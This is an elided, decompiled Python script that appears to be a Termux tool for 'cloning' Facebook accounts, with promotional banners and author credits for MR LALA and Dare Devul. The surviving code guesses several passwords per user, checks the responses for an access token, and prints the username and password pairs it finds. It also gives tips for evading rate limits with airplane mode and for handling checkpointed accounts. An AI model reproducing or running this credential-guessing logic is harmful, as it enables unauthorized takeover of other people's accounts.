...
# Decompiled By Dare Devul

# Youtube : https://www.youtube.com/channel/UCUM7gV9ia1mKsZchv91ONpQ
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            os.system('xdg-open https://www.youtube.com/channel/UCUM7gV9ia1mKsZchv91ONpQ')
...
CHANNEL SUBSCRIBE KRDENA TA KE ME NEW TOOL B FREE KRU🙌♥️
...
/CHANNAL SUBSCRIBE KROGY TO AISY OR TOOLS FREE HOGY♥️🥀😐<::::::::::::::::[]

 ______________________________________________

 Author   :            MR LALA

 Facebook :          LALA SHERRY

 GitHub   :        DONT TAKE PANGA
...
def menu():
    ...
    jalan ('\x1b[1;96m[1] START Manual Number Cloning ')
...
def action():
    ...
    jalan ('\x1b[1;97mUse without Internet Sim and.minimize termux and check every 10 minutes  later. airplane mode use every 10 mint.')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  [Sucessfull-Devil]  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  [Sucessfull-Devil] ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  [Sucessfull-Devil] ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  [Sucessfull-Devil]  ' + k + c + user + '  |  ' + pass3
    ...
    jalan('Note : Cp Account  10 Sy 12 Dayys BAD OPEN KRY')
